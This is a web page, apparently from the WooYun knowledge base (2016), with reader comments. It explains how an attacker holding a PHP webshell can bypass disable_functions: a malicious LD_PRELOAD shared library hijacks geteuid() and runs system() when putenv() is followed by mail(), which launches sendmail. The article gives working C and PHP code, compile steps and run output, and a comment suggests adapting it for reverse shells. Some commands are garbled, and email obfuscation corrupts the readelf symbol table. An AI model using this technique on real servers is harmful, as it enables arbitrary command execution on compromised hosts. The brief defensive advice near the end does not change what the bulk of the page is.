@@ -1,0 +1,92 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">YiYang</a> <span class="bull">·</span> <time title="2016/05/20 15:55" ui-time="" datetime="2016/05/20 15:55" class="published ng-binding ng-isolate-scope">2016/05/20 15:55</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>在做渗透测试的时候如果遇到安全配置比较好的服务器，当你通过各种途径获得一个php类型的webshell后，却发现面对的是无法执行系统命令的尴尬，因为这类服务器针对命令执行函数做了防范措施，后续的渗透行为都因此而止步。笔者这里分享一个绕过思路，希望你能在实际测试中派上用场。</p><h1>0x02 绕过思路</h1><hr><p>严苛环境下php设置的disable_function如下：</p><ul><li>dl</li><li>exec</li><li>system</li><li>passthru</li><li>popen</li><li>proc_open</li><li>pcntl_exec</li><li>shell_exec</li></ul><p>如果你遇到的设置中漏掉某些函数，那再好不过了，直接利用漏掉的函数绕过。但如果运气不太好，遇到这种所有能直接执行系统命令的函数都被禁用的情况，那真是欲哭无泪。想反弹一个cmdshell变成奢望。当然考虑到开发使用等影响因素，一般web环境不应完全禁用。</p><p>笔者经过大量资料搜寻，发现在这种情况下还有几种执行系统命令的方法，例如通过/proc/self/mem 修改got来劫持库函数调用以及php反序列化内存破坏漏洞利用，但这些方法利用起来难度都较大，你得先搞清楚内存偏移地址等等知识点，并搭建相同的平台进行调试。而且一般来说安全配置还会严格限制用户的文件权限并设置open_basedir，你根本没有机会去读取mem等文件，很难利用成功。</p><p>那么还有没有别的方法？putenv和mail函数给了我们希望，如果系统没有修补bash漏洞，利用网上已经给出的poc：<a href="http://www.exploit-db.com/exploits/35146/">http://www.exploit-db.com/exploits/35146/</a> 可以轻松绕过。</p><p>这个poc大体思路是通过putenv来设置一个包含自定义函数的环境变量，通过mail函数来触发。为什么mail函数能触发，因为mail函数在执行过程中，php与系统命令执行函数有了交集，它调用了popen函数来执行，如果系统有bash漏洞，就直接触发了恶意代码的执行。但一般这种漏洞，安全意识好一点的运维，都会给打上补丁了。</p><p>那么我们来继续挖掘一下它的思路，php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的了。那么我们有没有办法在webshell层来劫持它呢，环境变量LD_PRELOAD给我们提供了一种简单实用的途径。</p><h1>0x03 LD_PRELOAD hack</h1><hr><p>在UNIX的动态链接库的世界中，LD_PRELOAD是一个有趣的环境变量，它可以影响程序运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。如果你想进一步了解这些知识，可以去网上搜索相关文章，这里不做过多解释，直接来看一段例程，就能明白利用原理。</p><p>例程：verifypasswd.c</p><pre><code>#!c
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char **argv){
+char passwd[] = "password";
+if (argc &lt; 2) {
+        printf("usage: %s &lt;password&gt;/n", argv[0]);
+        return;
+}
+if (!strcmp(passwd, argv[1])) {
+        printf("Correct Password!/n");
+        return;
+}
+printf("Invalid Password!/n");
+}
+</code></pre><p>程序很简单，根据判断传入的字符串是否等于"password"，得出两种不同结果。 其中用到了标准C函数strcmp函数来做比较，这是一个外部调用函数，我们来重新编写一个同名函数：</p><pre><code>#!c
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+int strcmp(const char *s1, const char *s2){
+    printf("hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n", s1, s2);
+    return 0;
+}
+</code></pre><p>把它编译为一个动态共享库：</p><pre><code>#!shell
+$ gcc -o verifypasswd.c verifypasswd    
+
+$ gcc -shared verifypasswd -o hack.so
+</code></pre><p>通过LD_PRELOAD来设置它能被其他调用它的程序优先加载：</p><pre><code>#!shell
+$ export LD_PRELOAD="./hack.so"
+</code></pre><p>运行给出的例程：</p><pre><code>#!shell
+$ ./verifypasswd  abcd  
+
+$ Correct Password!
+</code></pre><p>我们看到随意输入字符串都会显示密码正确，这说明程序在运行时优先加载了我们自己编写的程序。这也就是说如果程序在运行过程中调用了某个标准的动态链接库的函数，那么我们就有机会通过LD_PRELOAD来设置它优先加载我们自己编写的程序，实现劫持。</p><h1>0x04 实战测试</h1><hr><p>那么我们来看一下sendmail函数都调用了哪些库函数，使用<code>readelf -Ws /usr/sbin/sendmail</code>命令来查看，我们发现sendmail函数在运行过程动态调用了很多标准库函数：</p><pre><code>#!shell
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="047d6d7d656a6344666b636b6a">[email&#160;protected]</a> Desktop]$ readelf -Ws /usr/sbin/sendmail  
+
+Symbol table '.dynsym' contains 202 entries:
+   Num:    Value          Size Type    Bind   Vis      Ndx Name
+     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
+     1: 0000000000000238     0 SECTION LOCAL  DEFAULT    1 
+     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ea8d8f9e8f8d838eaaada6a3a8a9">[email&#160;protected]</a>_2.2.5 (2)
+     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="91cecef4e3e3fffecefdfef2f0e5f8feffd1d6ddd8d3d2">[email&#160;protected]</a>_2.2.5 (2)
+     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND pcre_fullinfo
+     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="41353b32243501060d080302">[email&#160;protected]</a>_2.2.5 (2)
+     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c6b5b2b4a5b5b6a886818a8f8485">[email&#160;protected]</a>_2.2.5 (2)
+     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="530c0c30272a23360c273c26232336210c3f3c3013141f1a1110">[email&#160;protected]</a>_2.3 (3)
+     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1b4444786f626b7e446f7477746c7e69447774785b5c57525958">[email&#160;protected]</a>_2.3 (3)
+     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="046361706b74704443484d4647">[email&#160;protected]</a>_2.2.5 (2)
+    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="493a262a222c3d090e05000b0a">[email&#160;protected]</a>_2.2.5 (2)
+    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ea8c859881aaada6a3a8a9">[email&#160;protected]</a>_2.2.5 (2)
+    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND db_version
+    13: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5f00003a3129362d30311f1813161d1c">[email&#160;protected]</a>_2.2.5 (2)
+    14: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3f4c4b4d5a4d4d504d7f7873767d7c">[email&#160;protected]</a>_2.2.5 (2)
+    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6f181d061b0a2f2823262d2c">[email&#160;protected]</a>_2.2.5 (2)
+    16: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="66151214050e1426212a2f2425">[email&#160;protected]</a>_2.2.5 (2)
+    17: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="80f3e5f4e5f5e9e4c0c7ccc9c2c3">[email&#160;protected]</a>_2.2.5 (2)
+    18: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e7949395949789a7a0abaea5a4">[email&#160;protected]</a>_2.2.5 (2)
+    19: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2f70704c574e704946414e4346554a6f6863666d6c">[email&#160;protected]</a>_2.2.5 (2)
+    20: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="eb989f99878e85abaca7a2a9a8">[email&#160;protected]</a>_2.2.5 (2)
+......
+</code></pre><p>从中选取一个合适的库函数后我们就可以进行测试了：</p><ol><li>编制我们自己的动态链接程序。</li><li>通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。</li><li>在webshell上用mail函数发送一封邮件来触发。</li></ol><p>我们来测试删除一个新建的文件，这里我们选取geteuid()函数来改造，先在/tmp目录新建一个文件check.txt。</p><p>编写hack.c：</p><pre><code>#!c
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt; 
+
+void payload() {
+        system("rm /tmp/check.txt");
+}   
+
+int  geteuid() {
+if (getenv("LD_PRELOAD") == NULL) { return 0; }
+unsetenv("LD_PRELOAD");
+payload();
+}
+</code></pre><p>当这个共享库中的geteuid被调用时，尝试加载payload()函数，执行命令。这个测试函数写的很简单，实际应用时可相应调整完善。在攻击机上（注意编译平台应和靶机平台相近，至少不能一个是32位一个是64位）把它编译为一个位置信息无关的动态共享库：</p><pre><code>#!shell
+$ gcc -c -fPIC hack.c -o hack 
+
+$ gcc -shared hack -o hack.so
+</code></pre><p>再上传到webshell上，然后写一段简单的php代码：</p><pre><code>#!php
+&lt;?php
+putenv("LD_PRELOAD=/var/www/hack.so");
+mail("<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e081a08c8f83818c888f9394">[email&#160;protected]</a>","","","","");
+?&gt;
+</code></pre><p>在浏览器中打开就可以执行它，然后再去检查新建的文件是否还存在，找不到文件则表示系统成功执行了删除命令，也就意味着绕过成功，测试中注意修改为实际路径。 本地测试效果如下：</p><pre><code>#!shell
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f38a9a8a929d94b3919c949c9d">[email&#160;protected]</a> Desktop]$ touch /tmp/check.txt
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="51283828303f3611333e363e3f">[email&#160;protected]</a> bin]$ ./php mail.php
+sendmail: warning: the Postfix sendmail command has set-uid root file permissions
+sendmail: warning: or the command is run from a set-uid root process
+sendmail: warning: the Postfix sendmail command must be installed without set-uid root file permissions
+sendmail: fatal: setgroups(1, &amp;500): Operation not permitted
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7801110119161f381a171f1716">[email&#160;protected]</a> bin]$ cat /tmp/check.txt
+cat: /tmp/check.txt: No such file or directory
+</code></pre><p>普通用户权限，目标文件被删除。</p><h1>0x05 小结</h1><hr><p>以上方法在Linux RHEL6及自带邮件服务+php5.3.X以下平台测试通过，精力有限未继续在其他平台测试，新版本可能进行了相应修复。这种绕过行为其实也很容易防御，禁用相关函数或者限制环境变量的传递，例如安全模式下，这种传递是不会成功的。这个思路不仅仅局限于mail函数，你可以尝试追踪其他函数的调用过程，例如syslog等与系统层有交集的函数是否也有类似调用动态共享库的行为来举一反三。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">呆萌sky</span> <span class="reply-time">2016-06-15 16:35:05</span></div><p></p><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7a0a120a9ffdc79cefca93f8d99ec3f29fdee099faf899faf899faf83a9dfbd19ceddf9ceec19fded3">[email&#160;protected]</a></p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Melody</span> <span class="reply-time">2016-06-09 01:08:25</span></div><p></p><p>@火日攻天 firemail。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">火日攻天</span> <span class="reply-time">2016-06-08 20:37:22</span></div><p></p><p>草草看了一下php源码，貌似只有mail可以</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Pany自留地</span> <span class="reply-time">2016-06-01 01:02:15</span></div><p></p><p>学习了，刚刚一搜<br>https://bugs.php.net/bug.php?id=46741<br>原来这个问题一直存在，08年就提到过，官方估计觉得这是Linux系统机制问题，并没做出什么措施。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">winsyk</span> <span class="reply-time">2016-05-24 15:39:35</span></div><p></p><p>学习。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dafeng</span> <span class="reply-time">2016-05-23 15:26:51</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">YiYANG</span> <span class="reply-time">2016-05-23 11:36:25</span></div><p></p><p>@某个路人 回复这里不能贴图 但是我刚才特意去测试了一下ubuntu 15 也是虚拟机环境 是没有问题的 测试成功 你得自己找一下死机的原因了 遇到问题的时候 也是一个学习的机会</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">某个路人</span> <span class="reply-time">2016-05-23 09:01:28</span></div><p></p><p>我ubuntu的虚拟机 一测试就死机</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Rainism</span> <span class="reply-time">2016-05-22 00:05:08</span></div><p></p><p>0ctf web题。参考：https://rdot.org/forum/showpost.php?p=38750&amp;postcount=16</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">叮叮糖</span> <span class="reply-time">2016-05-21 20:32:03</span></div><p></p><p>昨天才了解到LD_PRELOAD这个功能，没想到这样用也行，厉害啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Chinalover</span> <span class="reply-time">2016-05-20 22:28:32</span></div><p></p><p>干货</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">YiYang</span> <span class="reply-time">2016-05-20 19:50:18</span></div><p></p><p>如果需要执行反弹等较复杂一些的指令，注意fork一个子进程再调用payload函数。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">RickGray</span> <span class="reply-time">2016-05-20 18:26:54</span></div><p></p><p>吊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小饼仔</span> <span class="reply-time">2016-05-20 18:04:10</span></div><p></p><p>666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DBA</span> <span class="reply-time">2016-05-20 17:48:01</span></div><p></p><p>Linux下tsock挂sock5代理就用的这个原理。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">r3aker</span> <span class="reply-time">2016-05-20 17:42:35</span></div><p></p><p>流弊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Xser</span> <span class="reply-time">2016-05-20 17:10:32</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2016-05-20 17:08:32</span></div><p></p><p>牛逼</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lightless</span> <span class="reply-time">2016-05-20 16:50:17</span></div><p></p><p>学习了。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">YiYang</span> <span class="reply-time">2016-05-20 16:46:39</span></div><p></p><p>@猪猪侠 偶像</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Creturn</span> <span class="reply-time">2016-05-20 16:42:38</span></div><p></p><p>思路不错！学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">猪猪侠</span> <span class="reply-time">2016-05-20 16:40:28</span></div><p></p><p>学习</p><p></p></div></div></div></div></div></main>
